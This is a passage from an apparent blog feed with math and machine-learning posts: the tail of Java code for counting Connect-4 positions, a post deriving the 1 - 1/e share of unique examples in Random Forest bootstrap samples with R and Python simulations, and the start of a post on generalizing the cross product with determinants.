			<span class="nc">LongArr</span> <span class="n">o</span> <span class="o">=</span> <span class="o">(</span><span class="nc">LongArr</span><span class="o">)</span> <span class="n">obj</span><span class="o">;</span>
			<span class="k">return</span> <span class="nc">Arrays</span><span class="o">.</span><span class="na">equals</span><span class="o">(</span><span class="n">arr</span><span class="o">,</span> <span class="n">o</span><span class="o">.</span><span class="na">arr</span><span class="o">);</span>
		<span class="o">}</span>
	<span class="o">}</span>

	<span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">main</span><span class="o">(</span><span class="nc">String</span><span class="o">[]</span> <span class="n">args</span><span class="o">)</span> <span class="o">{</span>
		<span class="nc">CountPositionsC4</span> <span class="n">cp</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">CountPositionsC4</span><span class="o">();</span>
		<span class="n">cp</span><span class="o">.</span><span class="na">countPositions</span><span class="o">(</span><span class="mi">0</span><span class="o">,</span> <span class="kc">false</span><span class="o">);</span>
		<span class="c1">// cp.countPositions(new int[]{0,9},false);</span>
	<span class="o">}</span>
<span class="o">}</span>

</code></pre></div></div> </li> </ul>]]></content><author><name></name></author><category term="Programming"/><category term="Connect-4"/><category term="AI"/><category term="tree-search"/><category term="alpha-beta"/><category term="minimax"/><category term="transposition tables"/><category term="opening databases"/><category term="move ordering"/><category term="bitboards"/><summary type="html"><![CDATA[A deep dive into the construction of intelligent agents for Connect-4. This introductory post covers the historical context, motivation, complexity of the game, and foundational concepts behind AI-based approaches‚Äîparticularly tree search and reinforcement learning methods. Includes a preview of the full 7-part series and links to an open-source Python3/C++ framework.]]></summary></entry><entry><title type="html">Understanding Bootstrap Sampling: Where Euler‚Äôs Number Meets Random Forests</title><link href="https://markusthill.github.io/blog/2025/sampling-with-replacement-random-forest/" rel="alternate" type="text/html" title="Understanding Bootstrap Sampling: Where Euler‚Äôs Number Meets Random Forests"/><published>2025-06-28T11:37:32+00:00</published><updated>2025-06-28T11:37:32+00:00</updated><id>https://markusthill.github.io/blog/2025/sampling-with-replacement-random-forest</id><content type="html" xml:base="https://markusthill.github.io/blog/2025/sampling-with-replacement-random-forest/"><![CDATA[<p>Consider the following classical problem in combinatorics: We have a bowl containing \(n\) distinct balls, each labeled with a unique number. We randomly draw a ball from the bowl, record its number, and then return it to the bowl before the next draw. The order of selection is not relevant, and this process is repeated \(k\) times. This setup is known as <strong>sampling with replacement</strong> or <strong>combinations with repetition</strong>.</p> <p>The number of distinct samples that can be drawn in this way is given by:</p> \[\binom{n+k-1}{k}\] <p>A particularly interesting case arises when \(k = n\), i.e., we draw \(n\) samples from a set of \(n\) unique elements, always replacing the drawn element. The image below illustrates this scenario: on the left is a set of four distinct elements; on the right are several possible samples obtained by sampling \(k = n = 4\) times with replacement. In total, 35 such combinations exist, as determined by the formula above.</p> <figure> <picture> <source class="responsive-img-srcset" srcset="/assets/img/2025-06-28-sampling-with-replacement-random-forest/sample_replace-480.webp 480w,/assets/img/2025-06-28-sampling-with-replacement-random-forest/sample_replace-800.webp 800w,/assets/img/2025-06-28-sampling-with-replacement-random-forest/sample_replace-1400.webp 1400w," type="image/webp" sizes="95vw"/> <img src="/assets/img/2025-06-28-sampling-with-replacement-random-forest/sample_replace.jpg" class="img-fluid rounded z-depth-1 imgcenter" width="90%" height="auto" data-zoomable="" loading="lazy" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> <figcaption class="caption"> <b>Figure 1:</b> Example of drawing \(n\) samples with replacement from a set of \(n\) unique elements. </figcaption> </figure> <p>But where is Euler‚Äôs number in this problem, and what does this have to do with Random Forests, as suggested by the title of this blog post?</p> <p>I came across this problem while examining the training process of Random Forests (RF) some time ago. Most implementations of Random Forests generate a bootstrap sample for each decision tree by drawing \(n\) times <em>with replacement</em> from the training data, which contains \(n\) examples. This naturally leads to a simple but interesting question: <strong>How many unique training examples can we expect in such a sample?</strong></p> <p>Because the sampling is done with replacement, some examples are likely to appear more than once. Consequently, the probability of obtaining a sample that contains all \(n\) unique elements is relatively low‚Äîassuming the training set is sufficiently large. In fact, this probability is precisely:</p> \[\frac{n!}{n^n}\] <p>On the other hand, the probability of drawing a sample containing only a <strong>single unique element</strong> is even smaller:</p> \[n \left(\frac{1}{n}\right)^n = n^{-(n-1)}\] <p>Intuitively, one might guess that about 50% of the training examples appear in a typical bootstrap sample. As we‚Äôll see shortly, the actual expected proportion is slightly higher.</p> <p>To get an initial intuition, we can run a simple simulation in R.</p> <figure class="highlight"><pre><code class="language-r" data-lang="r"><span class="c1"># How often do we want to repeat the simulation?</span><span class="w">
</span><span class="n">nSimulations</span><span class="w"> </span><span class="o">&lt;-</span><span class="w"> </span><span class="m">10000</span><span class="w">

</span><span class="n">runSimulation</span><span class="w"> </span><span class="o">&lt;-</span><span class="w"> </span><span class="k">function</span><span class="p">(</span><span class="n">n</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
  </span><span class="c1"># Function that draws a sample of size n from a set of n values</span><span class="w">
  </span><span class="c1"># and returns the fraction of unique values within the sample</span><span class="w">
  </span><span class="n">sampleWithRep</span><span class="w"> </span><span class="o">&lt;-</span><span class="w"> </span><span class="k">function</span><span class="p">(</span><span class="n">n</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
    </span><span class="c1"># sample the set n times with replacement</span><span class="w">
    </span><span class="n">p</span><span class="w"> </span><span class="o">&lt;-</span><span class="w"> </span><span class="n">sample</span><span class="p">(</span><span class="m">1</span><span class="o">:</span><span class="n">n</span><span class="p">,</span><span class="w"> </span><span class="n">n</span><span class="p">,</span><span class="w"> </span><span class="n">replace</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nb">T</span><span class="p">)</span><span class="w">

    </span><span class="c1"># compute the fraction of unique values in this sample</span><span class="w">
    </span><span class="nf">length</span><span class="p">(</span><span class="n">unique</span><span class="p">(</span><span class="n">p</span><span class="p">))</span><span class="w"> </span><span class="o">/</span><span class="w"> </span><span class="n">n</span><span class="w">
  </span><span class="p">}</span><span class="w">

  </span><span class="c1"># Run simulation many times and print the mean value for the</span><span class="w">
  </span><span class="c1"># fraction of unique values within all simulated samples</span><span class="w">
  </span><span class="n">mean</span><span class="p">(</span><span class="n">sapply</span><span class="p">(</span><span class="nf">rep</span><span class="p">(</span><span class="n">n</span><span class="p">,</span><span class="n">nSimulations</span><span class="p">),</span><span class="w"> </span><span class="n">sampleWithRep</span><span class="p">))</span><span class="w">
</span><span class="p">}</span><span class="w">

</span><span class="c1"># Sufficiently large set</span><span class="w">
</span><span class="n">n</span><span class="w"> </span><span class="o">&lt;-</span><span class="w"> </span><span class="m">10000</span><span class="w">

</span><span class="n">cat</span><span class="p">(</span><span class="s2">"On average, each sample contained"</span><span class="p">,</span><span class="w"> </span><span class="p">(</span><span class="n">runSimulation</span><span class="p">(</span><span class="n">n</span><span class="p">)</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="m">100.0</span><span class="p">),</span><span class="w">
    </span><span class="s2">"% of the values of the original set."</span><span class="p">)</span></code></pre></figure> <p>The above R-script should give you a value of approx. 63%, which indicates, that (for a sufficiently large training set, e.g. \(n=10\,000\)) roughly around 2/3 of the original training examples will appear in the sample. To show that this value of around 63% actually converges for increasing \(n\), we can run the following code (using the function defined above):</p> <figure class="highlight"><pre><code class="language-r" data-lang="r"><span class="n">require</span><span class="p">(</span><span class="n">ggplot2</span><span class="p">)</span><span class="w">
</span><span class="n">require</span><span class="p">(</span><span class="n">scales</span><span class="p">)</span><span class="w"> </span><span class="c1"># For nicer axis labels</span><span class="w">

</span><span class="c1"># Number of simulations for each value of n</span><span class="w">
</span><span class="n">nSimulations</span><span class="w"> </span><span class="o">&lt;-</span><span class="w"> </span><span class="m">10000</span><span class="w">

</span><span class="c1"># generate sequence 1, 2, ..., 9, 10, 20, ..., 90, 100, 200, ..., 900, 1000, ..., 90 000</span><span class="w">
</span><span class="n">Ns</span><span class="w"> </span><span class="o">&lt;-</span><span class="w"> </span><span class="nf">c</span><span class="p">(</span><span class="n">t</span><span class="p">(</span><span class="m">1</span><span class="o">:</span><span class="m">9</span><span class="p">)</span><span class="w"> </span><span class="o">%o%</span><span class="w"> </span><span class="m">10</span><span class="o">^</span><span class="p">(</span><span class="m">0</span><span class="o">:</span><span class="m">4</span><span class="p">))</span><span class="w">

</span><span class="c1"># Run simulation for different n's</span><span class="w">
</span><span class="n">frac</span><span class="w"> </span><span class="o">&lt;-</span><span class="w"> </span><span class="n">unlist</span><span class="p">(</span><span class="n">mclapply</span><span class="p">(</span><span class="n">Ns</span><span class="p">,</span><span class="w"> </span><span class="n">runSimulation</span><span class="p">,</span><span class="w"> </span><span class="n">mc.cores</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="m">23</span><span class="p">))</span><span class="w">

</span><span class="c1"># Zip</span><span class="w">
</span><span class="n">result</span><span class="w"> </span><span class="o">&lt;-</span><span class="w"> </span><span class="n">data.frame</span><span class="p">(</span><span class="n">n</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">Ns</span><span class="p">,</span><span class="w"> </span><span class="n">frac</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">frac</span><span class="p">)</span><span class="w">

</span><span class="c1"># Average of the last 10 values, for convergence line</span><span class="w">
</span><span class="n">convergeVal</span><span class="w"> </span><span class="o">&lt;-</span><span class="w"> </span><span class="nf">round</span><span class="p">(</span><span class="n">mean</span><span class="p">(</span><span class="n">frac</span><span class="p">[(</span><span class="nf">length</span><span class="p">(</span><span class="n">frac</span><span class="p">)</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="m">10</span><span class="p">)</span><span class="o">:</span><span class="nf">length</span><span class="p">(</span><span class="n">frac</span><span class="p">)]),</span><span class="w"> </span><span class="m">4</span><span class="p">)</span><span class="w">

</span><span class="n">p</span><span class="w"> </span><span class="o">&lt;-</span><span class="w"> </span><span class="n">ggplot</span><span class="p">(</span><span class="n">data</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">result</span><span class="p">,</span><span class="w"> </span><span class="n">aes</span><span class="p">(</span><span class="n">x</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">n</span><span class="p">,</span><span class="w"> </span><span class="n">y</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">frac</span><span class="p">))</span><span class="w"> </span><span class="o">+</span><span class="w">
  </span><span class="n">geom_line</span><span class="p">()</span><span class="w"> </span><span class="o">+</span><span class="w">
  </span><span class="n">geom_point</span><span class="p">(</span><span class="n">size</span><span class="o">=</span><span class="m">2.5</span><span class="p">)</span><span class="w"> </span><span class="o">+</span><span class="w">
  </span><span class="n">scale_x_log10</span><span class="p">(</span><span class="n">breaks</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="m">10</span><span class="o">^</span><span class="p">(</span><span class="m">1</span><span class="o">:</span><span class="m">5</span><span class="p">),</span><span class="w"> </span><span class="n">labels</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">comma</span><span class="p">,</span><span class="w"> </span><span class="n">limits</span><span class="o">=</span><span class="nf">c</span><span class="p">(</span><span class="m">1</span><span class="p">,</span><span class="m">1.2e5</span><span class="p">))</span><span class="w"> </span><span class="o">+</span><span class="w">
  </span><span class="n">scale_y_continuous</span><span class="p">(</span><span class="n">breaks</span><span class="o">=</span><span class="nf">c</span><span class="p">(</span><span class="m">1</span><span class="p">,</span><span class="w"> </span><span class="m">0.9</span><span class="p">,</span><span class="w"> </span><span class="m">0.8</span><span class="p">,</span><span class="w"> </span><span class="m">0.7</span><span class="p">,</span><span class="w"> </span><span class="n">convergeVal</span><span class="p">),</span><span class="w"> </span><span class="n">labels</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">comma</span><span class="p">)</span><span class="w"> </span><span class="o">+</span><span class="w">
  </span><span class="n">ylab</span><span class="p">(</span><span class="s2">"fraction of unique values"</span><span class="p">)</span><span class="w"> </span><span class="o">+</span><span class="w">
  </span><span class="n">theme_bw</span><span class="p">()</span><span class="w"> </span><span class="o">+</span><span class="w">
  </span><span class="n">theme</span><span class="p">(</span><span class="n">axis.text</span><span class="o">=</span><span class="n">element_text</span><span class="p">(</span><span class="n">size</span><span class="o">=</span><span class="m">20</span><span class="p">),</span><span class="w">
        </span><span class="n">axis.title</span><span class="o">=</span><span class="n">element_text</span><span class="p">(</span><span class="n">size</span><span class="o">=</span><span class="m">20</span><span class="p">,</span><span class="n">face</span><span class="o">=</span><span class="s2">"bold"</span><span class="p">))</span><span class="w">
</span><span class="n">plot</span><span class="p">(</span><span class="n">p</span><span class="p">)</span></code></pre></figure> <p>The equivalent code in Python would look like this:</p> <figure class="highlight"><pre><code class="language-python" data-lang="python"><span class="kn">import</span> <span class="n">numpy</span> <span class="k">as</span> <span class="n">np</span>
<span class="kn">import</span> <span class="n">matplotlib.pyplot</span> <span class="k">as</span> <span class="n">plt</span>

<span class="c1"># Number of simulations per value of n
</span><span class="n">n_simulations</span> <span class="o">=</span> <span class="mi">10_000</span> <span class="c1"># takes some time, reduce to 100 for a fast run
</span>
<span class="k">def</span> <span class="nf">run_simulation</span><span class="p">(</span><span class="n">n</span><span class="p">:</span> <span class="nb">int</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="nb">float</span><span class="p">:</span>
    <span class="sh">"""</span><span class="s">
    Draw n samples with replacement from a set of size n,
    repeated n_simulations times, and return the average fraction
    of unique elements per sample.
    </span><span class="sh">"""</span>
    <span class="n">fractions</span> <span class="o">=</span> <span class="p">[]</span>
    <span class="k">for</span> <span class="n">_</span> <span class="ow">in</span> <span class="nf">range</span><span class="p">(</span><span class="n">n_simulations</span><span class="p">):</span>
        <span class="n">sample</span> <span class="o">=</span> <span class="n">np</span><span class="p">.</span><span class="n">random</span><span class="p">.</span><span class="nf">choice</span><span class="p">(</span><span class="n">n</span><span class="p">,</span> <span class="n">size</span><span class="o">=</span><span class="n">n</span><span class="p">,</span> <span class="n">replace</span><span class="o">=</span><span class="bp">True</span><span class="p">)</span>
        <span class="n">unique_fraction</span> <span class="o">=</span> <span class="nf">len</span><span class="p">(</span><span class="n">np</span><span class="p">.</span><span class="nf">unique</span><span class="p">(</span><span class="n">sample</span><span class="p">))</span> <span class="o">/</span> <span class="n">n</span>
        <span class="n">fractions</span><span class="p">.</span><span class="nf">append</span><span class="p">(</span><span class="n">unique_fraction</span><span class="p">)</span>
    <span class="k">return</span> <span class="n">np</span><span class="p">.</span><span class="nf">mean</span><span class="p">(</span><span class="n">fractions</span><span class="p">)</span>

<span class="c1"># Create values of n: 1‚Äì9, 10, 20, ..., 90, 100, 200, ..., 90_000
</span><span class="n">Ns</span> <span class="o">=</span> <span class="n">np</span><span class="p">.</span><span class="nf">unique</span><span class="p">(</span><span class="n">np</span><span class="p">.</span><span class="nf">concatenate</span><span class="p">([</span><span class="n">np</span><span class="p">.</span><span class="nf">arange</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="mi">10</span><span class="p">)</span> <span class="o">*</span> <span class="mi">10</span><span class="o">**</span><span class="n">e</span> <span class="k">for</span> <span class="n">e</span> <span class="ow">in</span> <span class="nf">range</span><span class="p">(</span><span class="mi">5</span><span class="p">)]))</span>

<span class="c1"># Run simulations
</span><span class="n">fractions</span> <span class="o">=</span> <span class="p">[</span><span class="nf">run_simulation</span><span class="p">(</span><span class="n">n</span><span class="p">)</span> <span class="k">for</span> <span class="n">n</span> <span class="ow">in</span> <span class="n">Ns</span><span class="p">]</span>

<span class="c1"># Estimate convergence value from last 10 results
</span><span class="n">convergence_value</span> <span class="o">=</span> <span class="n">np</span><span class="p">.</span><span class="nf">round</span><span class="p">(</span><span class="n">np</span><span class="p">.</span><span class="nf">mean</span><span class="p">(</span><span class="n">fractions</span><span class="p">[</span><span class="o">-</span><span class="mi">10</span><span class="p">:]),</span> <span class="mi">4</span><span class="p">)</span>

<span class="c1"># Plot results
</span><span class="n">plt</span><span class="p">.</span><span class="nf">figure</span><span class="p">(</span><span class="n">figsize</span><span class="o">=</span><span class="p">(</span><span class="mi">10</span><span class="p">,</span> <span class="mi">6</span><span class="p">))</span>
<span class="n">plt</span><span class="p">.</span><span class="nf">plot</span><span class="p">(</span><span class="n">Ns</span><span class="p">,</span> <span class="n">fractions</span><span class="p">,</span> <span class="n">marker</span><span class="o">=</span><span class="sh">'</span><span class="s">o</span><span class="sh">'</span><span class="p">,</span> <span class="n">linestyle</span><span class="o">=</span><span class="sh">'</span><span class="s">-</span><span class="sh">'</span><span class="p">)</span>
<span class="n">plt</span><span class="p">.</span><span class="nf">xscale</span><span class="p">(</span><span class="sh">'</span><span class="s">log</span><span class="sh">'</span><span class="p">)</span>
<span class="n">plt</span><span class="p">.</span><span class="nf">xlabel</span><span class="p">(</span><span class="sh">"</span><span class="s">n (log scale)</span><span class="sh">"</span><span class="p">,</span> <span class="n">fontsize</span><span class="o">=</span><span class="mi">14</span><span class="p">)</span>
<span class="n">plt</span><span class="p">.</span><span class="nf">ylabel</span><span class="p">(</span><span class="sh">"</span><span class="s">Fraction of unique values</span><span class="sh">"</span><span class="p">,</span> <span class="n">fontsize</span><span class="o">=</span><span class="mi">14</span><span class="p">)</span>
<span class="n">plt</span><span class="p">.</span><span class="nf">title</span><span class="p">(</span><span class="sh">"</span><span class="s">Convergence of Unique Sample Fraction in Bootstrap Sampling</span><span class="sh">"</span><span class="p">,</span> <span class="n">fontsize</span><span class="o">=</span><span class="mi">16</span><span class="p">)</span>
<span class="n">plt</span><span class="p">.</span><span class="nf">axhline</span><span class="p">(</span><span class="n">convergence_value</span><span class="p">,</span> <span class="n">color</span><span class="o">=</span><span class="sh">'</span><span class="s">gray</span><span class="sh">'</span><span class="p">,</span> <span class="n">linestyle</span><span class="o">=</span><span class="sh">'</span><span class="s">--</span><span class="sh">'</span><span class="p">,</span> <span class="n">label</span><span class="o">=</span><span class="sa">f</span><span class="sh">'</span><span class="s">Converges to ~</span><span class="si">{</span><span class="n">convergence_value</span><span class="si">}</span><span class="sh">'</span><span class="p">)</span>
<span class="n">plt</span><span class="p">.</span><span class="nf">legend</span><span class="p">()</span>
<span class="n">plt</span><span class="p">.</span><span class="nf">grid</span><span class="p">(</span><span class="bp">True</span><span class="p">,</span> <span class="n">which</span><span class="o">=</span><span class="sh">"</span><span class="s">both</span><span class="sh">"</span><span class="p">,</span> <span class="n">ls</span><span class="o">=</span><span class="sh">"</span><span class="s">--</span><span class="sh">"</span><span class="p">,</span> <span class="n">linewidth</span><span class="o">=</span><span class="mf">0.5</span><span class="p">)</span>
<span class="n">plt</span><span class="p">.</span><span class="nf">tight_layout</span><span class="p">()</span>
<span class="n">plt</span><span class="p">.</span><span class="nf">show</span><span class="p">()</span></code></pre></figure> <p>Note that I run the code on a multicore system, since the computation on a single core would require a lot of time. The result of the above code is shown in the following graph:</p> <figure> <picture> <source class="responsive-img-srcset" srcset="/assets/img/2025-06-28-sampling-with-replacement-random-forest/convergence_sampling-480.webp 480w,/assets/img/2025-06-28-sampling-with-replacement-random-forest/convergence_sampling-800.webp 800w,/assets/img/2025-06-28-sampling-with-replacement-random-forest/convergence_sampling-1400.webp 1400w," type="image/webp" sizes="95vw"/> <img src="/assets/img/2025-06-28-sampling-with-replacement-random-forest/convergence_sampling.png" class="img-fluid rounded z-depth-1 imgcenter" width="90%" height="auto" data-zoomable="" loading="lazy" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> <figcaption class="caption"> <b>Figure 2:</b> Convergence for large sample sizes. </figcaption> </figure> <p>Obviously, for a training set and sample size of \(n=1\), we always have one unique value in the sample‚Äîi.e., 100% uniqueness. As \(n\) increases, the expected fraction of unique elements in the sample converges to approximately 0.6321, a value that might look familiar from various fields such as physics or probability theory. We will soon uncover the origin of this constant.</p> <p>After performing the simulations, we can now analytically calculate the expected number of unique examples in a sample drawn with replacement. Consider the random variable \(X_i\) for each example \(i \in \{1, \ldots, n\}\), defined as:</p> <ul> <li>\(X_i = 1\) if example \(i\) is selected at least once,</li> <li>\(X_i = 0\) otherwise.</li> </ul> <p>The probability \(P(X_i=1)\) is given by:</p> \[\begin{align} P(X_i=1) &amp;= 1 - P(X_i=0) \end{align}\] <p>It is easier to calculate \(P(X_i=0)\), the probability that example \(i\) is <em>not</em> selected in any of the \(n\) draws. Since each draw has probability \(\frac{n-1}{n}\) of avoiding \(i\), we have:</p> \[P(X_i=0) = \left(\frac{n-1}{n}\right)^n\] <p>Therefore, the probability \(P(X_i=1)\) becomes:</p> \[P(X_i=1) = 1 - \left(\frac{n-1}{n}\right)^n\] <p>As \(n\) approaches infinity, this limit converges to:</p> \[\begin{align} \lim_{n \to \infty} P(X_i=1) &amp;= 1 - \lim_{n \to \infty} \left(1 - \frac{1}{n}\right)^n \\ &amp;= 1 - e^{-1} \\ &amp;\approx 0.6321206 \end{align}\] <p>This result explains why Random Forests leave out roughly \(\frac{1}{e} \approx 36.8\%\) of the training examples in each bootstrap sample. These omitted samples form the so-called <strong>out-of-bag (OOB)</strong> data, which can be used as an unbiased estimate of the model‚Äôs generalization error.</p>]]></content><author><name></name></author><category term="stats"/><category term="ML"/><category term="math"/><summary type="html"><![CDATA[A common problem involves drawing a sample of size n from a set of n elements, with replacement. For example, in Random Forests, each decision tree is trained on a bootstrap sample drawn n times with replacement from the training data. A natural question is: how many unique examples can we expect in such a sample? Since sampling is done with replacement, some examples are likely selected multiple times, while others may not be selected at all.]]></summary></entry><entry><title type="html">Beyond 3D: Generalizing the Vector Cross Product</title><link href="https://markusthill.github.io/blog/2025/a-generalization-of-the-vector-cross-product/" rel="alternate" type="text/html" title="Beyond 3D: Generalizing the Vector Cross Product"/><published>2025-05-06T18:33:46+00:00</published><updated>2025-05-06T18:33:46+00:00</updated><id>https://markusthill.github.io/blog/2025/a-generalization-of-the-vector-cross-product</id><content type="html" xml:base="https://markusthill.github.io/blog/2025/a-generalization-of-the-vector-cross-product/"><![CDATA[<p>\( \def\matr#1{\mathbf #1} \def\tp{\mathsf T} \)</p> <p>Imagine you have two 3-dimensional vectors, \(\vec a\) and \(\vec b\), and you want to compute a third vector that is orthogonal to both. In three dimensions, this is straightforward: the cross product \(\vec a \times \vec b\) produces exactly such a vector. It is defined by the familiar formula:</p> \[\vec a \times \vec b = \begin{pmatrix} a_2b_3 - a_3b_2 \\ a_3b_1 - a_1b_3 \\ a_1b_2 - a_2b_1 \\ \end{pmatrix}.\] <p>In two dimensions, the situation is slightly different. Given a single vector \(\vec a\), its orthogonal counterpart can be obtained via a simple linear transformation:</p> \[\begin{pmatrix} a_1 \\ a_2 \\ \end{pmatrix} \mapsto \begin{pmatrix} a_2 \\ -a_1 \\ \end{pmatrix}\] <p>It‚Äôs easy to verify that the dot product of these two vectors is zero, confirming orthogonality.</p> <p>But what happens in higher dimensions? How would you define a cross product in 5 dimensions‚Äîor even in 100? Is there a generalization of the cross product that still yields a vector orthogonal to a given set of input vectors?</p> <p>As it turns out, computing a generalized cross product in higher dimensions is not as difficult as it might seem. In an \(n\)-dimensional space, \(\mathbb{R}^n\), the generalized cross product takes \(n - 1\) input vectors, each of length \(n\). These vectors must be pairwise linearly independent‚Äîotherwise, the result will be the zero vector. This condition ensures that the cross product spans the space orthogonal to all input vectors. Hence, we have a set of vectors</p> \[\vec u_1 =\begin{pmatrix} u_{11} \\ u_{21} \\ \vdots \\ u_{n1} \end{pmatrix}, \vec u_2= \begin{pmatrix} u_{12} \\ u_{22} \\ \vdots \\ u_{n2} \end{pmatrix}, \cdots, \vec u_{n-1} = \begin{pmatrix} u_{1(n-1)} \\ u_{2(n-1)} \\ \vdots \\ u_{n(n-1)} \end{pmatrix}.\] <p>Let us write the cross product as:</p> \[{‚®â}_{j=1}^{n-1} \vec u_j = \vec u_1 \times \vec u_2 \times \cdots \times \vec u_{n-1}\] <p>Now let us arrange all vectors \(\vec u_1 \cdots \vec u_{n-1}\) in a matrix. Additionally, we add a standard basis vector \(\vec e_i\) for dimension \(i\) as a first column in the matrix:</p> \[\matr U^i = \begin{bmatrix} \vec e_i &amp; \vec u_1 &amp; \cdots &amp; \vec u_{n-1} \end{bmatrix} = \begin{bmatrix} \mathbf e_1 &amp; u_{11} &amp; \cdots &amp; u_{1(n-1)}\\ \mathbf e_2 &amp; u_{21} &amp; \cdots &amp; u_{2(n-1)}\\ \vdots &amp; \vdots &amp; \ddots &amp; \vdots\\ \mathbf e_n &amp; u_{n1} &amp; \cdots &amp; u_{n(n-1)} \end{bmatrix}\] <p>The standard basis vector \(\vec e_i\) has magnitude 1 and points along the \(i\)‚Äëth coordinate axis. By inserting \(\vec e_i\) as the first column in our matrix, we obtain a slightly different matrix \(\matr U^i\) for each dimension \(i\).</p> <p>The generalized cross product can then be expressed in terms of determinants. While we won‚Äôt go into the full derivation here, the key idea is that each component of the resulting vector corresponds to the determinant of one of these matrices. Specifically, the \(i\)‚Äëth component of the cross product is given by:</p> \[\Big({‚®â}_{j=1}^{n-1} \vec u_j \Big ) _ {i} = \mbox{det}(\matr U_i) = |\matr U_i|\] <p>Overall, we receive a vector in the following form:</p> \[{‚®â}_{j=1}^{n-1} \vec u_j = \begin{pmatrix} \mbox{det}(\matr U_1) \\ \mbox{det}(\matr U_2) \\ \vdots \\ \mbox{det}(\matr U_n) \\ \end{pmatrix}\] <p>Since the first column of \(\matr U_i\) contains only a single nonzero entry (a 1 in row \(i\)), the determinant can be efficiently computed using Laplace expansion along the first column. This reduces the computation to a single minor, making the process both simple and elegant.</p> <p>Let‚Äôs illustrate this with our initial example using the vectors:</p> \[\vec a =\begin{pmatrix} a_{1} \\ a_{2} \\ a_3 \end{pmatrix}, \vec b =\begin{pmatrix} b_{1} \\ b_{2} \\ b_3 \end{pmatrix}.\] <p>We first create the matrix \(\matr U_i\), which is:</p> \[\matr U_i =\begin{bmatrix} \mathbf e_1 &amp; a_{1} &amp; b_{1}\\ \mathbf e_2 &amp; a_{2} &amp; b_{2}\\ \mathbf e_3 &amp; a_3 &amp; b_3 \end{bmatrix}.\] <p>Then, we can compute the first element of the cross product vector for axis \(i=1\):</p> \[\begin{align*} \mbox{det}(\matr U_1) &amp;= \begin{vmatrix} \mathbf 1 &amp; a_{1} &amp; b_{1}\\ \mathbf 0 &amp; a_{2} &amp; b_{2}\\ \mathbf 0 &amp; a_3 &amp; b_3 \end{vmatrix} \\ &amp; = 1 \cdot \begin{vmatrix} a_{2} &amp; b_{2}\\ a_3 &amp; b_3 \end{vmatrix} - 0 \cdot \begin{vmatrix} a_{1} &amp; b_{1}\\ a_3 &amp; b_3 \end{vmatrix} + 0 \cdot \begin{vmatrix} a_{1} &amp; b_{1}\\ a_{2} &amp; b_{2} \end{vmatrix} \\ &amp; = a_2 b_3 - a_3 b_2 . \end{align*}\] <p>For the other two axis \(i=2\) and \(i=3\) we follow the same procedure and get:</p> \[\begin{align*} \mbox{det}(\matr U_2) &amp;= \begin{vmatrix} \mathbf 0 &amp; a_{1} &amp; b_{1}\\ \mathbf 1 &amp; a_{2} &amp; b_{2}\\ \mathbf 0 &amp; a_3 &amp; b_3 \end{vmatrix} \\ &amp; = 0 \cdot \begin{vmatrix} a_{2} &amp; b_{2}\\ a_3 &amp; b_3 \end{vmatrix} - 1 \cdot \begin{vmatrix} a_{1} &amp; b_{1}\\ a_3 &amp; b_3 \end{vmatrix} + 0 \cdot \begin{vmatrix} a_{1} &amp; b_{1}\\ a_{2} &amp; b_{2} \end{vmatrix} \\ &amp; = a_3 b_1 - a_1 b_3 \end{align*}\] \[\begin{align*} \mbox{det}(\matr U_3) &amp;= \begin{vmatrix} \mathbf 0 &amp; a_{1} &amp; b_{1}\\ \mathbf 0 &amp; a_{2} &amp; b_{2}\\ \mathbf 1 &amp; a_3 &amp; b_3 \end{vmatrix} \\ &amp; = 0 \cdot \begin{vmatrix} a_{2} &amp; b_{2}\\ a_3 &amp; b_3 \end{vmatrix} - 0 \cdot \begin{vmatrix} a_{1} &amp; b_{1}\\ a_3 &amp; b_3 \end{vmatrix} + 1 \cdot \begin{vmatrix} a_{1} &amp; b_{1}\\ a_{2} &amp; b_{2} \end{vmatrix} \\ &amp; = a_1 b_2 - a_2 b_1 . \end{align*}\] <p>Summarizing the previous results, we receive for the cross product \(\vec a \times \vec b\):</p> \[\vec a \times \vec b = \begin{pmatrix} \mbox{det}(\matr U_1) \\ \mbox{det}(\matr U_2) \\ \mbox{det}(\matr U_3) \\ \end{pmatrix} = \begin{pmatrix} a_2 b_3 - a_3 b_2 \\ a_3 b_1 - a_1 b_3 \\ a_1 b_2 - a_2 b_1 \\ \end{pmatrix}\] <p>which is exactly the same as we have already noted in the beginning.</p> <p>Note that the base R function <code class="language-plaintext highlighter-rouge">crossprod()</code> does not compute the vector cross product as discussed in this post‚Äîit actually returns the matrix product \(A^\top B\). To compute the generalized cross product in arbitrary dimensions, I provide a custom R function below that implements the determinant-based method described above.</p> <figure class="highlight"><pre><code class="language-r" data-lang="r"><span class="n">opX</span><span class="w"> </span><span class="o">&lt;-</span><span class="w"> </span><span class="k">function</span><span class="p">(</span><span class="n">...</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
  </span><span class="n">u</span><span class="w"> </span><span class="o">&lt;-</span><span class="w"> </span><span class="nf">list</span><span class="p">(</span><span class="n">...</span><span class="p">)</span><span class="w">
  </span><span class="c1">#</span><span class="w">
  </span><span class="c1"># check length of all vectors</span><span class="w">
  </span><span class="c1">#</span><span class="w">
  </span><span class="n">len</span><span class="w"> </span><span class="o">&lt;-</span><span class="w"> </span><span class="n">unlist</span><span class="p">(</span><span class="n">lapply</span><span class="p">(</span><span class="n">u</span><span class="p">,</span><span class="w"> </span><span class="n">length</span><span class="p">))</span><span class="w">
